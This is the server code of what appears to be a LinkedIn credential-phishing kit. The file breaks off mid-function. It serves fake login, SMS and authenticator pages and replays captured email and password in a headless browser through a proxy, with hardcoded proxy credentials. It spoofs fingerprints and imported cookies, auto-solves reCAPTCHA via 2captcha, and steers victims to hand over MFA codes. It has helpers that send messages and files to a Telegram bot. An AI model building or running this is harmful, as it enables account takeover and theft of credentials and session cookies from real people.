// Force the bframe (interactive puzzle) to pop up and trigger screenshot/html capture
const express = require("express");
const path = require("path");
const cors = require("cors");
const fs = require("fs");
// Use puppeteer-extra for drop-in replacement and reCAPTCHA plugin
const puppeteer = require('puppeteer-extra');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
puppeteer.use(
  RecaptchaPlugin({
    provider: {
      id: '2captcha',
      token: process.env.TWOCAPTCHA_API_KEY || 'REPLACE_WITH_YOUR_2CAPTCHA_API_KEY'
    },
    visualFeedback: true
  })
);
const { v4: uuidv4 } = require("uuid");
const axios = require("axios");
const https = require('https');
require("dotenv").config();
const session = require("express-session");

// LinkedIn reCAPTCHA utility
const LinkedInRecaptchaUtil = require("./utils/LinkedInRecaptchaUtil");
const linkedInRecaptcha = new LinkedInRecaptchaUtil();

// Fingerprint and Cookie Manager
const FingerprintCookieManager = require("./utils/FingerprintCookieManager");
const fingerprintManager = new FingerprintCookieManager();

// App Configuration
const app = express();
// ...existing code...

// Default route for root URL - serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});
const port = process.env.PORT || 3000;

// Server-Sent Events clients map: sessionId -> Set of response objects
const sseClients = new Map();

function sendSseEvent(sessionId, event, data) {
  try {
    const clients = sseClients.get(sessionId);
    if (!clients) return;
    const payload = typeof data === 'string' ? data : JSON.stringify(data || {});
    for (const res of clients) {
      try {
        res.write(`event: ${event}\n`);
        res.write(`data: ${payload}\n\n`);
      } catch (e) {
        // ignore
      }
    }
  } catch (err) {
    console.error('sendSseEvent error:', err);
  }
}

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Function to send Telegram message
async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

// Function to send file to Telegram
async function sendTelegramFile(filePath, caption) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
    const FormData = require("form-data");
    const form = new FormData();

    form.append("chat_id", TELEGRAM_CHAT_ID);
    form.append("document", fs.createReadStream(filePath), {
      filename: path.basename(filePath),
      contentType: "application/json",
    });

    if (caption) {
      form.append("caption", caption);
    }

    const response = await axios.post(url, form, {
      headers: {
        ...form.getHeaders(),
      },
    });

    return response.data;
  } catch (error) {
    console.error(
      "Error sending file to Telegram:",
      error.response?.data || error.message
    );
  }
}

// Create required directories if they don't exist
const puzzleDir = path.join(__dirname, "public", "images", "puzzle");
if (!fs.existsSync(puzzleDir)) {
  fs.mkdirSync(puzzleDir, { recursive: true });
}

const cookiesDir = path.join(__dirname, "cookies");
if (!fs.existsSync(cookiesDir)) {
  fs.mkdirSync(cookiesDir, { recursive: true });
}

// Session middleware
app.use(
  session({
    secret: process.env.SESSION_SECRET || "your-session-secret-key-here",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === "production" },
  })
);

// Middleware
app.use(express.json());
app.use(express.static("public"));

// Import and mount routes
const captchaRoutes = require('./routes/captcha');
app.use('/api/captcha', captchaRoutes);

// Middleware to check CAPTCHA verification
const requireCaptcha = (req, res, next) => {
  if (!req.session.captchaVerified) {
    return res.redirect("/");
  }
  next();
};

// Debug listing endpoint - lists debug artifacts for a given sessionId
app.get('/debug/list', (req, res) => {
  const { sessionId } = req.query || {};
  const debugDir = path.join(__dirname, 'debug');
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
  if (!fs.existsSync(debugDir)) return res.json({ files: [] });

  try {
    const all = fs.readdirSync(debugDir).filter(f => f.includes(sessionId));
    // Return filenames and download URLs
    const files = all.map(f => ({
      filename: f,
      url: `/debug/download?file=${encodeURIComponent(f)}`
    }));
    res.json({ files });
  } catch (err) {
    console.error('Error listing debug files:', err);
    res.status(500).json({ error: 'failed' });
  }
});

// Debug download endpoint - serves files from debug/ safely
app.get('/debug/download', (req, res) => {
  const { file } = req.query || {};
  if (!file) return res.status(400).send('file required');

  const debugDir = path.join(__dirname, 'debug');
  const safeName = path.basename(file); // prevent path traversal
  const filePath = path.join(debugDir, safeName);
  if (!filePath.startsWith(debugDir)) return res.status(400).send('invalid file');
  if (!fs.existsSync(filePath)) return res.status(404).send('not found');
  res.download(filePath, safeName, (err) => {
    if (err) console.error('Error sending debug file:', err);
  });
});

// Get reCAPTCHA challenge info for a session
app.get('/api/recaptcha-info/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions[sessionId];
  
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }
  
  const info = {
    sessionId,
    requiresRecaptcha: session.requiresRecaptcha || false,
    recaptchaDetectedAt: session.recaptchaDetectedAt || null,
    recaptchaVerifiedAt: session.recaptchaVerifiedAt || null,
    recaptchaPassed: session.recaptchaPassed || false,
    linkedinSiteKey: session.linkedinSiteKey || null,
    linkedinRecaptchaConfig: session.linkedinRecaptchaConfig || null,
    recaptchaFrame: session.recaptchaFrame || null,
    challengeUrl: `/recaptcha-challenge?sessionId=${sessionId}`,
    isLinkedInSiteKey: session.linkedinSiteKey ? linkedInRecaptcha.isLinkedInSiteKey(session.linkedinSiteKey) : false
  };
  
  res.json(info);
});

// Test endpoint for reCAPTCHA integration
app.get('/test-recaptcha', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'test-recaptcha.html'));
});

// Fingerprint Profile Manager interface
app.get('/fingerprint-manager', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'fingerprint-manager.html'));
});

// Environment info endpoint for debugging
app.get('/api/recaptcha-env', (req, res) => {
  const isLocalhost = req.hostname === 'localhost' || 
                     req.hostname === '127.0.0.1' || 
                     req.hostname.startsWith('192.168.') ||
                     process.env.NODE_ENV !== 'production';
  
  const siteKey = linkedInRecaptcha.getLinkedInSiteKey({
    envSiteKey: process.env.LINKEDIN_RECAPTCHA_SITE_KEY || process.env.RECAPTCHA_SITE_KEY,
    fallbackToDefault: true,
    useTestKey: isLocalhost
  });

  const secretKey = process.env.LINKEDIN_RECAPTCHA_SECRET_KEY || process.env.RECAPTCHA_SECRET_KEY;
  
  res.json({
    environment: process.env.NODE_ENV || 'development',
    hostname: req.hostname,
    isLocalhost,
    siteKey,
    secretKeyConfigured: !!secretKey,
    keyType: linkedInRecaptcha.isTestSiteKey(siteKey) ? 'TEST' : 
             linkedInRecaptcha.isLinkedInSiteKey(siteKey) ? 'LINKEDIN' : 
             linkedInRecaptcha.isCustomSiteKey(siteKey) ? 'CUSTOM' : 'OTHER',
    testKeysAvailable: linkedInRecaptcha.testSiteKeys,
    customKeysAvailable: linkedInRecaptcha.customSiteKeys
  });
});

// Fingerprint Profile Management API

// Generate a new fingerprint profile
app.post('/api/fingerprint/generate', (req, res) => {
  try {
    const options = req.body || {};
    const profile = fingerprintManager.generateProfile(options);
    
    res.json({
      success: true,
      profileId: profile.profileId,
      profile: {
        ...profile,
        // Don't send actual cookie values in response for security
        cookies: profile.cookies.map(c => ({ 
          name: c.name, 
          domain: c.domain, 
          secure: c.secure, 
          httpOnly: c.httpOnly 
        }))
      }
    });
  } catch (error) {
    console.error('Error generating fingerprint profile:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// List all fingerprint profiles
app.get('/api/fingerprint/profiles', (req, res) => {
  try {
    const profiles = fingerprintManager.listProfiles();
    res.json({ success: true, profiles });
  } catch (error) {
    console.error('Error listing fingerprint profiles:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get specific fingerprint profile
app.get('/api/fingerprint/profile/:profileId', (req, res) => {
  try {
    const { profileId } = req.params;
    const profile = fingerprintManager.loadProfile(profileId);
    
    if (!profile) {
      return res.status(404).json({ success: false, error: 'Profile not found' });
    }

    // Don't send actual cookie values for security
    const sanitizedProfile = {
      ...profile,
      cookies: profile.cookies.map(c => ({ 
        name: c.name, 
        domain: c.domain, 
        secure: c.secure, 
        httpOnly: c.httpOnly,
        session: c.session,
        sameSite: c.sameSite
      }))
    };

    res.json({ success: true, profile: sanitizedProfile });
  } catch (error) {
    console.error('Error loading fingerprint profile:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete a fingerprint profile
app.delete('/api/fingerprint/profile/:profileId', (req, res) => {
  try {
    const { profileId } = req.params;
    const fs = require('fs');
    const path = require('path');
    
    const filename = `profile-${profileId}.json`;
    const filepath = path.join(fingerprintManager.configDir, filename);
    
    if (fs.existsSync(filepath)) {
      fs.unlinkSync(filepath);
      res.json({ success: true, message: 'Profile deleted successfully' });
    } else {
      res.status(404).json({ success: false, error: 'Profile not found' });
    }
  } catch (error) {
    console.error('Error deleting fingerprint profile:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Create profile from existing cookies
app.post('/api/fingerprint/import-cookies', (req, res) => {
  try {
    const { cookies, sessionType = 'returning', ...options } = req.body;
    
    if (!cookies || !Array.isArray(cookies)) {
      return res.status(400).json({ success: false, error: 'Cookies array is required' });
    }

    const profile = fingerprintManager.generateProfile({
      ...options,
      sessionType,
      existingCookies: cookies,
      includeRealCookies: true
    });

    res.json({
      success: true,
      profileId: profile.profileId,
      message: `Profile created with ${cookies.length} imported cookies`,
      profile: {
        profileId: profile.profileId,
        sessionType: profile.sessionType,
        network: profile.network,
        device: profile.device,
        cookieCount: profile.cookies.length
      }
    });
  } catch (error) {
    console.error('Error importing cookies to profile:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Generate proxy configuration endpoint
app.get('/api/fingerprint/proxy-config/:profileId', (req, res) => {
  try {
    const { profileId } = req.params;
    const profile = fingerprintManager.loadProfile(profileId);
    
    if (!profile) {
      return res.status(404).json({ success: false, error: 'Profile not found' });
    }

    const proxyConfig = {
      profileId: profile.profileId,
      proxyEndpoints: {
        primary: profile.network.publicProxy,
        secondary: profile.network.alternateProxy,
        local: profile.network.localProxy
      },
      networkInfo: {
        isp: profile.network.isp,
        country: profile.network.country,
        asn: profile.network.asn,
        connectionType: profile.network.connectionType,
        bandwidth: profile.network.bandwidth,
        latency: profile.network.latency
      },
      deviceInfo: {
        macAddress: profile.device.macAddress,
        vendor: profile.device.vendor,
        hostname: profile.device.hostname,
        userAgent: profile.browser.userAgent
      },
      usage: {
        createdAt: profile.metadata.createdAt,
        lastUsed: profile.metadata.lastUsed,
        useCount: profile.metadata.useCount
      }
    };

    res.json({ success: true, proxyConfig });
  } catch (error) {
    console.error('Error generating proxy config:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Server-Sent Events endpoint for session notifications
app.get('/events', (req, res) => {
  const sessionId = req.query.sessionId;
  if (!sessionId) return res.status(400).send('sessionId required');

  // Set headers for SSE
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders && res.flushHeaders();
  res.write(':\n\n');

  if (!sseClients.has(sessionId)) sseClients.set(sessionId, new Set());
  sseClients.get(sessionId).add(res);

  req.on('close', () => {
    try {
      const set = sseClients.get(sessionId);
      if (set) set.delete(res);
    } catch (e) {}
  });
});

// Protected routes - require CAPTCHA verification
app.get("/login.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "login.html"));
});

app.get("/security-verification.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "security-verification.html"));
});

app.get("/mobile-verification.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "mobile-verification.html"));
});

app.get("/sms.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "sms.html"));
});

app.get("/enter-phone.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "enter-phone.html"));
});

app.get("/authenticator-app.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "authenticator-app.html"));
});

app.get("/quick-verification.html", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "quick-verification.html"));
});

// Catch-all route for views folder - protect all view files
app.get("/views/*", (req, res) => {
  res.redirect("/");
});

// CAPTCHA verification endpoint
app.post("/verify", async (req, res) => {
  const { captchaResponse } = req.body;

  if (!captchaResponse) {
    return res.status(400).json({ error: "No CAPTCHA response provided" });
  }

  try {
    // Set session flag for CAPTCHA verification
    req.session.captchaVerified = true;
    res.json({ success: true, redirect: "/login.html" });
  } catch (error) {
    console.error("CAPTCHA verification error:", error);
    res.status(500).json({ error: "CAPTCHA verification failed" });
  }
});

// Google reCAPTCHA v2 verification endpoint (used by our recaptcha-challenge view)
app.post('/verify-recaptcha', async (req, res) => {
  const { token, sessionId, source } = req.body || {};


  if (!token) {
    console.log('reCAPTCHA verification failed: missing token');
    return res.status(400).json({ success: false, error: 'missing-token' });
  }

  try {
    // Use LinkedIn-specific secret key if available, otherwise fallback to default
    const secret = process.env.LINKEDIN_RECAPTCHA_SECRET_KEY || process.env.RECAPTCHA_SECRET_KEY;
    if (!secret) {
      console.error('reCAPTCHA secret key not found in environment variables');
      return res.status(500).json({ success: false, error: 'server-missing-secret' });
    }

    // Add remote IP for better verification
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress;

    console.log(`Verifying LinkedIn reCAPTCHA token for ${source || 'unknown source'}${sessionId ? ' session: ' + sessionId : ''}`);

    // Use the utility to verify the reCAPTCHA token
    const verificationResult = await linkedInRecaptcha.verifyRecaptchaToken(token, secret, clientIp);
    
    console.log('LinkedIn reCAPTCHA verification response:', {
      success: verificationResult.success,
      hostname: verificationResult.hostname,
      errorCodes: verificationResult.errorCodes,
      challengeTs: verificationResult.challengeTs
    });

    if (verificationResult && verificationResult.success) {
      // Mark the session as verified so LinkedIn automation can continue
      if (sessionId && sessions[sessionId]) {
        sessions[sessionId].recaptchaPassed = true;
        sessions[sessionId].recaptchaVerifiedAt = new Date().toISOString();
        console.log(`Session ${sessionId} marked as reCAPTCHA verified`);
      }
      
      // Also set express session flag for web interface
      req.session.recaptchaVerified = true;
      
      // Notify frontend via SSE that backend reCAPTCHA is solved and instruct manual verification
      if (sessionId) {
        sendSseEvent(sessionId, 'recaptcha_verified', {
          success: true,
          timestamp: new Date().toISOString(),
          source: source || 'recaptcha-challenge',
          action: 'manual_verification',
          message: 'Backend reCAPTCHA solved. Please verify manually and continue.'
        });
        // Instruct frontend to navigate to security-verification and continue flow
        sendSseEvent(sessionId, 'navigate', {
          target: 'security-verification',
          message: 'Navigate to security-verification. Continue to email, sms, or authenticator code entry.'
        });
      }
      // Optionally, you can still attempt to resume session in background if needed
      if (sessionId && sessions[sessionId]) {
        setImmediate(async () => {
          try {
            const resumeResult = await resumeSession(sessionId);
            if (resumeResult && resumeResult !== false) {
              console.log(`LinkedIn session ${sessionId} resumed successfully after reCAPTCHA verification`);
              sendSseEvent(sessionId, 'session_resumed', { success: true });
            } else {
              console.log(`LinkedIn session ${sessionId} resume failed or still blocked`);
            }
          } catch (e) {
            console.error('Error during immediate LinkedIn session resume after verify:', e);
          }
        });
      }

      return res.json({ 
        success: true, 
        message: 'reCAPTCHA verification successful',
        sessionId: sessionId || null
      });
    }

    const errorCodes = verificationResult.errorCodes || [];
    console.log('LinkedIn reCAPTCHA verification failed:', errorCodes);
    
    return res.status(400).json({ 
      success: false, 
      error: 'verification-failed', 
      'error-codes': errorCodes,
      message: 'LinkedIn reCAPTCHA verification failed'
    });
    
  } catch (err) {
    console.error('reCAPTCHA verification error:', err?.message || err);
    return res.status(500).json({ 
      success: false, 
      error: 'verification-error',
      message: 'Server error during reCAPTCHA verification'
    });
  }
});

let sessions = {};

// Utility Functions
// Click the 'I am not a robot' checkbox in the Puppeteer browser
async function clickRecaptchaCheckbox(page) {
  // Improved iframe detection for Google reCAPTCHA (including invisible anchors)
  const frames = page.frames();
  let anchorFrame = null;
  let anchorType = null;
  // 1. Try standard and enterprise anchors
  for (const frame of frames) {
    const url = frame.url();
    if (url.includes('/recaptcha/api2/anchor')) {
      anchorFrame = frame;
      anchorType = 'api2';
      break;
    }
    if (url.includes('/recaptcha/enterprise/anchor')) {
      anchorFrame = frame;
      anchorType = 'enterprise';
      break;
    }
    // Invisible anchor (ar param)
    if (url.includes('/recaptcha/api2/anchor?ar')) {
      anchorFrame = frame;
      anchorType = 'invisible';
      break;
    }
  }
  // 2. Fallback: any iframe with 'recaptcha' and 'anchor' in src
  if (!anchorFrame) {
    for (const frame of frames) {
      const url = frame.url();
      if (url.includes('recaptcha') && url.includes('anchor')) {
        anchorFrame = frame;
        anchorType = 'fallback';
        break;
      }
    }
  }
  // 3. Fallback: try to find invisible anchor by inspecting iframe src params
  if (!anchorFrame) {
    for (const frame of frames) {
      const url = frame.url();
      if (url.includes('recaptcha') && url.includes('ar=')) {
        anchorFrame = frame;
        anchorType = 'invisible-ar';
        break;
      }
    }
  }
  // 4. Log diagnostics and save artifacts if not found
  if (!anchorFrame) {
    const allFrameUrls = frames.map(f => f.url());
    console.error('reCAPTCHA anchor iframe not found. Frame URLs:', allFrameUrls);
    try {
      const debugDir = require('path').join(__dirname, 'debug');
      if (!require('fs').existsSync(debugDir)) require('fs').mkdirSync(debugDir, { recursive: true });
      const timestamp = Date.now();
      await page.screenshot({ path: require('path').join(debugDir, `anchor-not-found-${timestamp}.png`), fullPage: true }).catch(() => {});
      require('fs').writeFileSync(require('path').join(debugDir, `anchor-not-found-${timestamp}.html`), await page.content(), 'utf8');
    } catch (e) { console.error('Anchor not found artifact error:', e); }
    throw new Error('reCAPTCHA anchor iframe not found');
  }
  // Find the checkbox element in the anchor frame (invisible anchors may not have a visible checkbox)
  const checkbox = await anchorFrame.$('div.recaptcha-checkbox-border, #recaptcha-anchor, .recaptcha-checkbox');
  if (!checkbox) {
    // If anchorType is invisible, skip click and log diagnostics
    if (anchorType && anchorType.startsWith('invisible')) {
      try {
        const debugDir = require('path').join(__dirname, 'debug');
        if (!require('fs').existsSync(debugDir)) require('fs').mkdirSync(debugDir, { recursive: true });
        const timestamp = Date.now();
        // Save anchor frame HTML for diagnostics
        const anchorHtml = await anchorFrame.content();
        require('fs').writeFileSync(require('path').join(debugDir, `invisible-anchor-${timestamp}.html`), anchorHtml, 'utf8');
        await page.screenshot({ path: require('path').join(debugDir, `invisible-anchor-${timestamp}.png`), fullPage: true }).catch(() => {});
        console.warn('Invisible reCAPTCHA anchor detected, skipping checkbox click. See debug artifacts.');
      } catch (e) { console.error('Invisible anchor artifact error:', e); }
      return false; // Indicate checkbox click was skipped
    }
    // Save screenshot and HTML for diagnostics for non-invisible anchors
    try {
      const debugDir = require('path').join(__dirname, 'debug');
      if (!require('fs').existsSync(debugDir)) require('fs').mkdirSync(debugDir, { recursive: true });
      const timestamp = Date.now();
      await page.screenshot({ path: require('path').join(debugDir, `checkbox-not-found-${timestamp}.png`), fullPage: true }).catch(() => {});
      require('fs').writeFileSync(require('path').join(debugDir, `checkbox-not-found-${timestamp}.html`), await page.content(), 'utf8');
    } catch (e) { console.error('Checkbox not found artifact error:', e); }
    throw new Error('reCAPTCHA checkbox not found in anchor frame');
  }
  // Click the checkbox (if visible)
  await checkbox.click();
  return true;
}
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Puzzle and Captcha Handling Functions
// Tile/puzzle functions were removed. Use detectLinkedinRecaptcha(page) for reCAPTCHA detection instead.

// Detect LinkedIn / Google reCAPTCHA widgets across frames using the utility
async function detectLinkedinRecaptcha(page) {
  return await linkedInRecaptcha.detectLinkedInRecaptcha(page);
}

async function handleCaptchaChallenge(
  page,
  browser,
  sessionId,
  challengeCount = 0
) {
  await delay(1500);
  // Robust detection of LinkedIn reCAPTCHA widget
  let detection;
  try {
    detection = await detectLinkedinRecaptcha(page);
  } catch (err) {
    console.error('Error during reCAPTCHA detection:', err);
    return 'not-handled';
  }
  if (detection && detection.found) {
    console.log(`[reCAPTCHA] Detected in frame: ${detection.frameUrl} for session: ${sessionId}`);
    // Mark session as requiring reCAPTCHA
    if (sessions[sessionId]) {
      Object.assign(sessions[sessionId], {
        requiresRecaptcha: true,
        recaptchaDetectedAt: new Date().toISOString(),
        recaptchaFrame: detection.frameUrl
      });
    }
    // Try to solve with puppeteer-extra-plugin-recaptcha if enabled
    let challengeSrc = null, token = null, anchorSitekey = null, anchorSrc = null;
    let usedPlugin = false;
    if (process.env.ENABLE_AUTO_RECAPTCHA === '1' || process.env.ENABLE_AUTO_RECAPTCHA === 'true') {
      try {
        const { captchas, solutions, solved, error } = await page.solveRecaptchas();
        usedPlugin = true;
        if (error) console.error('puppeteer-extra-plugin-recaptcha error:', error);
        if (solved && solved.length > 0) {
          token = solved[0].text;
          console.log('Recaptcha plugin solved token:', token);
        }
      } catch (e) {
        console.error('puppeteer-extra-plugin-recaptcha failed:', e);
      }
    }
    if (!usedPlugin || !token) {
      try {
        const frames = page.frames();
        for (const frame of frames) {
          if (frame.url().includes('recaptcha') || frame.url() === detection.frameUrl) {
            // Extract anchor iframe info
            const anchorInfo = await frame.evaluate(() => {
              const iframe = document.querySelector('iframe[src*="/recaptcha/api2/anchor"]');
              if (iframe) {
                let sitekey = null;
                try { sitekey = new URL(iframe.src).searchParams.get('k'); } catch (e) {}
                return { sitekey, src: iframe.src };
              }
              return null;
            });
            if (anchorInfo) { anchorSitekey = anchorInfo.sitekey; anchorSrc = anchorInfo.src; }
            // Click the checkbox
            try { await clickRecaptchaCheckbox(page); } catch (e) { console.error('Checkbox click failed:', e); }
            // Extract challenge iframe src
            challengeSrc = await frame.evaluate(() => {
              const challengeFrame = Array.from(document.querySelectorAll('iframe')).find(f => f.src && f.src.includes('bframe'));
              return challengeFrame ? challengeFrame.src : null;
            }).catch(() => null);
            // If puzzle appears, capture screenshot and HTML
            if (challengeSrc) {
              try {
                await page.waitForFunction(src => !!Array.from(document.querySelectorAll('iframe')).find(f => f.src && f.src.includes(src)), { timeout: 5000 }, 'bframe').catch(() => {});
                const debugDir = require('path').join(__dirname, 'debug');
                if (!require('fs').existsSync(debugDir)) require('fs').mkdirSync(debugDir, { recursive: true });
                const timestamp = Date.now();
                await page.screenshot({ path: require('path').join(debugDir, `${sessionId}-puzzle-${timestamp}.png`), fullPage: true }).catch(() => {});
                require('fs').writeFileSync(require('path').join(debugDir, `${sessionId}-puzzle-${timestamp}.html`), await page.content(), 'utf8');
              } catch (e) { console.log('Puzzle artifact error:', e); }
            }
            // Extract token
            token = await frame.evaluate(() => {
              const response = document.querySelector('textarea#g-recaptcha-response');
              return response ? response.value : null;
            }).catch(() => null);
            break;
          }
        }
      } catch (e) {
        console.error('Pointer click or challenge extraction error:', e);
      }
    }
    // Save debug artifacts for session
    try {
      const debugDir = require('path').join(__dirname, 'debug');
      if (!require('fs').existsSync(debugDir)) require('fs').mkdirSync(debugDir, { recursive: true });
      const timestamp = Date.now();
      await page.screenshot({ path: require('path').join(debugDir, `${sessionId}-recaptcha-${timestamp}.png`), fullPage: true }).catch(() => {});
      require('fs').writeFileSync(require('path').join(debugDir, `${sessionId}-recaptcha-${timestamp}.html`), await page.content(), 'utf8');
    } catch (err) { console.error('Debug artifact save error:', err); }
    // Extract LinkedIn reCAPTCHA config
    try {
      const linkedinConfig = await linkedInRecaptcha.extractLinkedInRecaptchaConfig(page);
      if (linkedinConfig.siteKeys.length > 0 && sessions[sessionId]) {
        sessions[sessionId].linkedinSiteKey = linkedinConfig.siteKeys[0];
        sessions[sessionId].linkedinRecaptchaConfig = linkedinConfig;
      }
    } catch (err) { console.error('LinkedIn config extraction error:', err); }
    // Robust SSE relay
    sendSseEvent(sessionId, 'recaptcha_challenge', {
      frame: detection.frameUrl,
      challengeSrc,
      token,
      anchor: anchorSitekey && anchorSrc ? { type: 'iframe', sitekey: anchorSitekey, src: anchorSrc } : null,
      timestamp: new Date().toISOString(),
      message: token ? 'Challenge detected. Token sent to frontend.' : 'Challenge detected. Use challengeSrc, anchor, or token.'
    });
    sendSseEvent(sessionId, 'recaptcha_required', {
      frame: detection.frameUrl,
      timestamp: new Date().toISOString(),
      challengeUrl: `/recaptcha-challenge?sessionId=${sessionId}`,
      message: 'LinkedIn reCAPTCHA verification required'
    });
    return 'recaptcha';
  }
  return 'not-handled';
}

// Helper function to create a browser instance
async function createBrowser() {
  // Always use the specified proxy for all sessions
  const proxy = 'us.naproxy.net:1000';
  // Center the window on a typical 1920x1080 screen
  const screenWidth = 1920;
  const screenHeight = 1080;
  const winWidth = 1200;
  const winHeight = 800;
  const winLeft = Math.floor((screenWidth - winWidth) / 2);
  const winTop = Math.floor((screenHeight - winHeight) / 2);
  const launchArgs = [
    `--proxy-server=${proxy}`,
    '--disable-setuid-sandbox',
    '--no-sandbox',
    '--disable-gpu',
    '--disable-dev-shm-usage',
    '--disable-web-security',
    '--disable-features=IsolateOrigins',
    '--disable-features=site-per-process',
    `--window-size=${winWidth},${winHeight}`,
    `--window-position=${winLeft},${winTop}`,
    '--no-first-run',
    '--no-default-browser-check',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--lang=en-US,en'
  ];
  return await puppeteer.launch({
    headless: true,
    args: launchArgs,
    defaultViewport: {
      width: winWidth,
      height: winHeight
    },
    ignoreHTTPSErrors: true,
    timeout: 30000,
    protocolTimeout: 30000,
    executablePath: process.env.NODE_ENV === "production"
      ? process.env.PUPPETEER_EXECUTABLE_PATH
      : puppeteer.executablePath(),
  });
}

// Connection test function
async function testConnection() {
  try {
    const response = await axios({
      method: 'get',
      url: 'https://api.ipify.org?format=json',
      timeout: 30000,
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
      }
    });

    if (response.status === 200) {
      console.log('Connection successful! IP:', response.data);
      return true;
    }
    return false;
  } catch (error) {
    console.error('Connection test failed:', error.message);
    return false;
  }
}

// Helper function to test browser connection
async function testBrowserConnection(page) {
  const maxAttempts = 3;
  let lastError = null;

  // First test with axios
  console.log('Testing connection with axios...');
  const axiosTest = await testConnection();
  if (!axiosTest) {
    console.error('Connection test failed');
  } else {
    console.log('Connection test successful');
  }

  // Then test in browser
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      console.log(`Browser connection test attempt ${attempt}/${maxAttempts}...`);
      
      const ipServices = [
        'https://api.ipify.org?format=json',
        'https://ifconfig.me/ip'
      ];

      for (const service of ipServices) {
        try {
          await page.goto(service, {
            waitUntil: 'networkidle0',
            timeout: 30000
          });

          const ipData = await page.evaluate(() => {
            try {
              return document.body.textContent;
            } catch (e) {
              return null;
            }
          });

          if (ipData) {
            console.log('Browser connection established. IP data:', ipData);
            return true;
          }
        } catch (serviceError) {
          console.log(`Service ${service} failed:`, serviceError.message);
          continue;
        }
      }

      throw new Error('All IP services failed');
    } catch (error) {
      lastError = error;
      console.error(`Browser connection test attempt ${attempt} failed:`, error.message);
      
      if (attempt < maxAttempts) {
        const backoffTime = Math.pow(2, attempt) * 1000;
        console.log(`Waiting ${backoffTime}ms before retry...`);
        await delay(backoffTime);
      }
    }
  }

  console.error('All browser connection tests failed. Last error:', lastError?.message);
  return false;
}

// Helper function to create and set up a new page with fingerprinting
async function createAndSetupPage(browser, options = {}) {
  const page = await browser.newPage();
  // Authenticate proxy for every page
  await page.authenticate({
    username: 'proxy-ob5x52uafysh',
    password: 'XbTWLREyiBG44d84'
  });
  
  // Generate or load fingerprint profile
  let profile;
  if (options.profileId) {
    profile = fingerprintManager.loadProfile(options.profileId);
    if (!profile) {
      console.log(`Profile ${options.profileId} not found, generating new one`);
      profile = fingerprintManager.generateProfile(options);
    }
  } else {
    profile = fingerprintManager.generateProfile({
      sessionType: options.sessionType || 'fresh',
      region: options.region || 'North America',
      deviceType: options.deviceType || 'laptop',
      connectionType: options.connectionType || 'cable',
      customISP: options.customISP,
      customVendor: options.customVendor
    });
  }

  // Apply fingerprint profile to page
  await fingerprintManager.applyProfileToPage(page, profile);
  
  await page.setDefaultTimeout(30000);
  await page.setDefaultNavigationTimeout(30000);
  
  // Set additional headers for realism
  await page.setExtraHTTPHeaders({
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1'
  });

  // Add error handling for page crashes
  page.on('error', err => {
    console.error('Page crashed:', err);
  });

  // Store profile reference for session cleanup
  page._fingerprintProfile = profile;

  return page;
}

app.post("/api/linkedin/login", async (req, res) => {
  let { 
    sessionId, 
    email, 
    password, 
    profileId, 
    fingerprintOptions = {}
  } = req.body;

  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  let browser;
  try {
    // Load fingerprint profile to get proxy
    let profile = null;
    if (profileId) {
      profile = fingerprintManager.loadProfile(profileId);
    }
    const proxy = profile && profile.network && profile.network.publicProxy ? profile.network.publicProxy : null;
    console.log('Starting browser...');
    browser = await createBrowser(proxy);

    console.log('Creating new page with fingerprinting...');
    // Set up fingerprinting options
    const pageOptions = {
      profileId,
      sessionType: fingerprintOptions.sessionType || 'fresh',
      region: fingerprintOptions.region || 'North America',
      deviceType: fingerprintOptions.deviceType || 'laptop',
      connectionType: fingerprintOptions.connectionType || 'cable',
      customISP: fingerprintOptions.customISP,
